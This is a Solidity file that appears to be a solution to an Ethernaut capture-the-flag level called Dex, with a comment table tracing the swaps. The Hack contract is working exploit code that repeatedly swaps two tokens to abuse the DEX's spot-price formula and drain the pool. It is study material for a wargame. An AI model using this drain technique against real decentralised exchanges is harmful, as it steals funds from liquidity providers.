// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*

  (Liquidity pool)                      swap                          (amount * to ) /from
  Token A   Token B                Token A     Token B             
  100         100                   10     ->   10                            1

  110         90                     0     <-   20                            24             

  86          110                   24     ->   0                             30

  110         80                     0     <-    30                           41    

  69          110                    41    ->    0                            65   

  110         45                     0      <-   65(swap 45 only)        (amount *110)/45 = 110  =>amount = 45  => (41*120)/45 =110

  0           90                     110          0

____________________________________________________________________________________________________________________________________________________________________________________

 only msg.sender = EOA when Dex is deployed can call approve function in Dex to approve hack contract to spend Token A + Token B
                                      or
   only msg.sender = EOA when Dex is deployed (that indirecty create ERC20 Token A ,Token B ) can approve hack hack contract to spend Token A or Token B respectively


step 1  -> create hack contract
step 2  -> a. load token1 using token1 address + ERC20 interface   -> approve(hack contract address,1005)     
           b. same for token 2 also
                                           or
        -> load Dex contract using token1 address + ERC20 interface -> approve(hack contract address,1005)   -> inbuild by Ethernaut to make easy -> approve both token1,2 in one function

you can't use any hack contract to call approve() of ERC20 token1,token2 instance only in this case  because  EOA has ownership of these token if we call transferFrom () by any hack contract  msg.sender is address(hack)  here but EOA have ownership of token initally when ERC20 instance is created
you have call manually by loading instance by EOA

For better understanding -> solve Naught Coin 15th Challenge

*/              

interface IERC20 
{
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function balanceOf(address account) external view returns (uint256);

}
contract Hack
{
  function hack_start() public
  {
    IDex adr = IDex(0x41a9503F4Ce5ba828aF7a22FC4797650E440519c);
    IERC20 a = IERC20(adr.token1());   //token1 contract instance 
    IERC20 b = IERC20(adr.token2());  // token2 cotract instance

    // a!= address but instance

    a.approve(address(adr),type(uint).max ); //  contract aprove dex to spend its token
    b.approve(address(adr),type(uint).max );

    a.transferFrom(msg.sender,address(this),10);  //sending token a,b to contract     
    b.transferFrom(msg.sender,address(this),10);
    // adr.swap(address(a), address(b), 10);
    // adr.swap(address(b), address(a), 20);
    // adr.swap(address(a), address(b), 24);
    // adr.swap(address(b), address(a), 30);
    // adr.swap(address(a), address(b), 41);
    // adr.swap(address(b), address(a), 45);
      adr.swap(address(a), address(b),a.balanceOf(address(this)));
      adr.swap(address(b), address(a),b.balanceOf(address(this)));
      adr.swap(address(a), address(b),a.balanceOf(address(this)));
      adr.swap(address(b), address(a),b.balanceOf(address(this)));
      adr.swap(address(a), address(b),a.balanceOf(address(this)));
      adr.swap(address(b), address(a),45); 
  }
  // function hack_start() public 
  // {

  // }
}

interface IDex
{
    function token1() external view returns(address);
    function token2() external view returns(address);
    function swap(address  , address , uint  ) external ;
    function getSwapPrice(address  , address , uint  ) external view returns(uint256);
    function balanceOf(address token, address account) external  view returns (uint);
}

